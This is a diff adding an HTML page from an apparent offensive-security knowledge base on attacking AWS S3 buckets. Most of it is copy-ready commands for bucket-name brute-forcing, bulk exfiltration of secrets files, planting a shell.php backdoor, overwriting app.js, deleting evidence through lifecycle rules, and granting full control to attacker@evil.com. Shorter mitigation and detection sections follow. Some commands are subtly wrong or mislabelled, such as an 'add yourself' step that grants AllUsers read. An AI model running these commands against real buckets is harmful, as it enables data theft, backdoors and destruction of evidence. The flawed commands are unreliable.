@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>S3 Attacks | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Cloud Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Cloud Security</a> / S3 Attacks
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1552</span>
+      <h1>🪣 S3 Bucket Attacks</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1552</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>AWS S3</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Credential Access</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy-Medium</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Amazon S3 (Simple Storage Service) buckets are a common target for attackers due to misconfigurations that allow unauthorized access, data exfiltration, and potential privilege escalation.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why S3 is Targeted:</strong>
+        <ul>
+          <li><strong>Data-rich:</strong> Often contains backups, configs, keys, PII</li>
+          <li><strong>Misconfigurations:</strong> Public access, weak ACLs, wrong policies</li>
+          <li><strong>Easy enumeration:</strong> Bucket names are often predictable</li>
+          <li><strong>Credential leakage:</strong> S3 logs may expose keys</li>
+          <li><strong>Lateral movement:</strong> Can lead to further compromise</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 2. ENUMERATION -->
+    <div class="content-section" id="enumeration">
+      <h2>🔍 Enumeration</h2>
+      
+      <p><strong>List All S3 Buckets:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># AWS CLI enumeration
+aws s3 ls
+aws s3 ls --region us-east-1
+
+# List all buckets across regions
+aws s3api list-buckets --query 'Buckets[*].[Name,Region]'
+
+# Get bucket location
+aws s3api get-bucket-location --bucket target-bucket</pre>
+      </div>
+
+      <p><strong>Enumerate Bucket Contents:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List bucket contents
+aws s3 ls s3://target-bucket/
+aws s3 ls s3://target-bucket/ --recursive
+
+# Get bucket policy
+aws s3api get-bucket-policy --bucket target-bucket
+
+# Get bucket ACL
+aws s3api get-bucket-acl --bucket target-bucket
+
+# Get bucket versioning
+aws s3api get-bucket-versioning --bucket target-bucket</pre>
+      </div>
+
+      <p><strong>Public Access Check:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check public access block
+aws s3api get-public-access-block --bucket target-bucket
+
+# Check bucket policy status
+aws s3api get-bucket-policy-status --bucket target-bucket
+
+# Check ACL for Everyone
+aws s3api get-bucket-acl --bucket target-bucket | grep -i everyone</pre>
+      </div>
+
+      <p><strong>Website Hosting Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check website configuration
+aws s3api get-bucket-website --bucket target-bucket
+
+# Try direct access
+curl https://target-bucket.s3.amazonaws.com
+curl https://target-bucket.s3.amazonaws.com/.git/config</pre>
+      </div>
+    </div>
+
+    <!-- 3. ACCESS TECHNIQUES -->
+    <div class="content-section" id="access">
+      <h2>💣 Access Techniques</h2>
+      
+      <p><strong>1. Anonymous Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List public bucket
+aws s3 ls s3://public-bucket/ --no-sign-request
+
+# Download files
+aws s3 cp s3://public-bucket/secrets.csv ./ --no-sign-request
+aws s3 sync s3://public-bucket/ ./local-dir/ --no-sign-request
+
+# Direct HTTP access
+curl https://public-bucket.s3.amazonaws.com/secrets.csv</pre>
+      </div>
+
+      <p><strong>2. Authenticated Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># With credentials
+aws s3 ls s3://target-bucket/
+aws s3 sync s3://target-bucket/ ./download/ --region us-east-1
+
+# Recursive download
+aws s3 cp s3://target-bucket/ . --recursive</pre>
+      </div>
+
+      <p><strong>3. Find Bucket Names:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Common patterns
+aws s3 ls s3://company-name-prod/
+aws s3 ls s3://company-name-staging/
+aws s3 ls s3://company-name-backup/
+
+# Subdomain enumeration
+nslookup target.com
+# Look for s3.company.com
+
+# Wayback Machine
+curl "https://web.archive.org/web/*/https://*.s3.amazonaws.com/*"</pre>
+      </div>
+    </div>
+
+    <!-- 4. DATA EXFILTRATION -->
+    <div class="content-section" id="exfiltration">
+      <h2>📤 Data Exfiltration</h2>
+      
+      <p><strong>Download Everything:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Full sync
+aws s3 sync s3://target-bucket/ /tmp/exfil/ --region us-east-1
+
+# Specific file types
+aws s3 sync s3://target-bucket/ /tmp/exfil/ --exclude "*" --include "*.env"
+aws s3 sync s3://target-bucket/ /tmp/exfil/ --exclude "*" --include "*.sql"
+aws s3 sync s3://target-bucket/ /tmp/exfil/ --exclude "*" --include "*config*"
+
+# Check for sensitive extensions
+# .env, .pem, .sql, .zip, .bak, .config, .csv, .json</pre>
+      </div>
+
+      <p><strong>Versioned Bucket Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List object versions
+aws s3api list-object-versions --bucket target-bucket
+
+# Get specific version
+aws s3api get-object --bucket target-bucket --key backup/v1.zip version-id VERSION_ID output.zip
+
+# List delete markers
+aws s3api list-object-versions --bucket target-bucket --prefix "" | grep DeleteMarker</pre>
+      </div>
+
+      <p><strong>Common Sensitive Files:</strong></p>
+      <ul>
+        <li><code>.env</code> - Environment variables with API keys</li>
+        <li><code>config/*.json</code> - Configuration files</li>
+        <li><code>backup/*.sql</code> - Database backups</li>
+        <li><code>keys/*.pem</code> - Private keys</li>
+        <li><code>creds.json</code> - Hardcoded credentials</li>
+        <li><code>.git/config</code> - Git repository leaks</li>
+      </ul>
+    </div>
+
+    <!-- 5. UPLOAD & PERSISTENCE -->
+    <div class="content-section" id="persistence">
+      <h2>🎯 Upload & Persistence</h2>
+      
+      <p><strong>Upload Malicious Files:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Upload backdoor
+aws s3 cp shell.php s3://vulnerable-bucket/shell.php
+
+# Overwrite legitimate files
+aws s3 cp malicious.js s3://app-bucket/static/app.js --storage-class STANDARD
+
+# Set custom metadata
+aws s3 cp payload s3://target-bucket/ --metadata "source=legitimate"</pre>
+      </div>
+
+      <p><strong>Setup Website Backdoor:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If bucket is website-enabled
+aws s3 website s3://target-bucket/ --index-document index.html --error-document error.html
+
+# Upload reverse shell as index
+aws s3 cp index.html s3://malicious-bucket/
+
+# Set correct content-type
+aws s3 cp shell.php s3://target-bucket/ --content-type "application/x-httpd-php"</pre>
+      </div>
+
+      <p><strong>Object Lifecycle Exploitation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check lifecycle rules
+aws s3api get-bucket-lifecycle-configuration --bucket target-bucket
+
+# If you can modify, set immediate expiration to destroy evidence
+aws s3api put-bucket-lifecycle-configuration --bucket target-bucket --lifecycle-configuration '{
+  "Rules": [{
+    "ID": "EvictAll",
+    "Status": "Enabled",
+    "Expiration": {"Days": 1},
+    "Filter": {"Prefix": ""}
+  }]
+}'</pre>
+      </div>
+    </div>
+
+    <!-- 6. BUCKET ACL EXPLOITATION -->
+    <div class="content-section" id="acl">
+      <h2>🔓 ACL Exploitation</h2>
+      
+      <p><strong>Grant Permissions to Yourself:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Add yourself to bucket ACL
+aws s3api put-bucket-acl --bucket target-bucket --grant-read uri=http://acs.amazonaws.com/groups/global/AllUsers
+
+# Add specific user
+aws s3api put-bucket-acl --bucket target-bucket --grant-full-control email-address=attacker@evil.com
+
+# Remove public access
+aws s3api put-public-access-block --bucket target-bucket \
+    --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"</pre>
+      </div>
+
+      <p><strong>Check Current Permissions:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># View full ACL
+aws s3api get-bucket-acl --bucket target-bucket
+
+# Check policy
+aws s3api get-bucket-policy --bucket target-bucket | jq .Policy
+
+# View all permissions
+aws s3api get-object-acl --bucket target-bucket --key sensitive/file.txt</pre>
+      </div>
+    </div>
+
+    <!-- 7. CROSS-ACCOUNT ATTACKS -->
+    <div class="content-section" id="cross-account">
+      <h2>🚀 Cross-Account Attacks</h2>
+      
+      <p><strong>Assume Role via Bucket Policy:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check for cross-account policies
+aws s3api get-bucket-policy --bucket target-bucket
+
+# Look for iam:PassRole or sts:AssumeRole in policy
+# If you can trigger Lambda from S3 event, you might escalate</pre>
+      </div>
+
+      <p><strong>Lambda S3 Exploitation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If bucket triggers Lambda
+# Lambda might have higher privileges
+
+# Upload malicious file to trigger Lambda
+aws s3 cp payload.zip s3://target-bucket/trigger.zip
+
+# Lambda could have ec2:DescribeInstances, iam:CreateUser, etc.</pre>
+      </div>
+    </div>
+
+    <!-- 8. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Secure Configuration:</strong>
+        <ul>
+          <li><strong>Block Public Access:</strong> Enable for all buckets</li>
+          <li><strong>Use Bucket Policies:</strong> Explicit deny for public access</li>
+          <li><strong>Encrypt Data:</strong> SSE-KMS for sensitive data</li>
+          <li><strong>Versioning:</strong> Enable for backup and audit</li>
+          <li><strong>Logging:</strong> Enable S3 access logging</li>
+          <li><strong>Tags:</strong> Label sensitive buckets</li>
+        </ul>
+      </div>
+
+      <p><strong>AWS Config Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Required remediations
+- s3-bucket-public-read-prohibited
+- s3-bucket-public-write-prohibited
+- s3-bucket-ssl-requests-only
+- s3-bucket-versioning-enabled
+- s3-bucket-logging-enabled</pre>
+      </div>
+
+      <p><strong>Bucket Policy Example (Deny Unencrypted):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Sid": "DenyUnEncryptedUploads",
+    "Effect": "Deny",
+    "Principal": "*",
+    "Action": "s3:PutObject",
+    "Resource": "arn:aws:s3:::target-bucket/*",
+    "Condition": {
+      "Null": {
+        "s3:x-amz-server-side-encryption": "true"
+      }
+    }
+  }]
+}</pre>
+      </div>
+    </div>
+
+    <!-- 9. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>CloudTrail Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Events to alert on
+- ListBuckets (unusual times)
+- GetObject on sensitive prefixes
+- PutObject with malware patterns
+- DeleteObject on critical files
+- PutBucketPolicy with public access
+- GetBucketAcl
+
+# CloudWatch filter pattern
+fields @timestamp, s3.bucket.name, s3.object.key, errorCode
+| filter (eventName = "GetObject") and (s3.object.key like /secret|cred|key|backup/)
+| sort @timestamp desc</pre>
+      </div>
+
+      <p><strong>GuardDuty Findings:</strong></p>
+      <ul>
+        <li>Exfiltration:S3/ObjectRead.All</li>
+        <li>Discovery:S3/BucketDiscovery</li>
+        <li>UnauthorizedAccess:S3/MaliciousIPCaller</li>
+      </ul>
+    </div>
+
+    <!-- 10. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <div class="info-box">
+        <strong>Automated enumeration:</strong>
+        <ul>
+          <li><strong>aws-cli:</strong> Official CLI for S3 operations</li>
+          <li><strong>s3fs:</strong> Mount S3 as filesystem</li>
+          <li><strong>mass3:</strong> Brute-force bucket names</li>
+          <li><strong>bucket-view:</strong> Web-based bucket enumeration</li>
+        </ul>
+      </div>
+
+      <p><strong>Mass Enumeration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use wordlist for common names
+for word in $(cat wordlist.txt); do
+  aws s3 ls s3://$word/ --no-sign-request 2>/dev/null && echo "FOUND: $word"
+done
+
+# Check for company backups
+aws s3 ls s3://company-backup/ --no-sign-request
+aws s3 ls s3://company-prod/ --no-sign-request
+aws s3 ls s3://company-dev/ --no-sign-request</pre>
+      </div>
+    </div>
+
+    <!-- 11. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://notsosecure.com/anatomy-of-aws-s3-attacks/" target="_blank">AWS S3 Attack Anatomy</a></li>
+        <li><a href="https://rhinosecuritylabs.com/aws/aws-s3-data-exfiltration/" target="_blank">S3 Data Exfiltration</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Exploitation" target="_blank">AWS Payloads</a></li>
+        <li><a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html" target="_blank">S3 Security Best Practices</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Cloud Security</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
